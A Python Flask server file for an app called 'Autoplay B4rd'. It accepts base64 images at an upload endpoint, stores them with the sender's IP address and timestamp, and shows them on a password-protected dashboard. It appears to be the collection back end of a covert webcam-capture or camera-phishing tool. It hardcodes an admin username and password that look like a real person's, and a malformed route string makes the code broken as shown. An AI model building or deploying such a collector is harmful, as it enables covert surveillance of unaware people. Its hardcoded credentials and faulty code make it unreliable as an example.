# server/app.py
from flask import Flask, request, render_template, redirect, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os, base64, socket

app = Flask(__name__)
app.secret_key = "supersecret"
app.config['UPLOAD_FOLDER'] = 'static/uploads'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///../database/log.db'

db = SQLAlchemy(app)

class Capture(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    image = db.Column(db.String(100))

@app.route('\')
def home():
    return 'welcome to Autoplay B4rd!'

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    ip = request.remote_addr
    if 'image' in data:
        img_data = data['image'].split(',')[1]
        filename = datetime.utcnow().strftime('%Y%m%d%H%M%S') + '.jpg'
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(img_data))
        db.session.add(Capture(ip=ip, image=filename))
        db.session.commit()
    return 'OK'

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form['username'] == "anuroopkonala" and request.form['password'] == "Anuroop56":
            session['admin'] = True
            return redirect('/dashboard')
    return render_template('admin.html')

@app.route('/dashboard')
def dashboard():
    if not session.get('admin'):
        return redirect('/admin')
    captures = Capture.query.all()
    return render_template('dashboard.html', captures=captures)

if __name__ == '__main__':
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=10000)

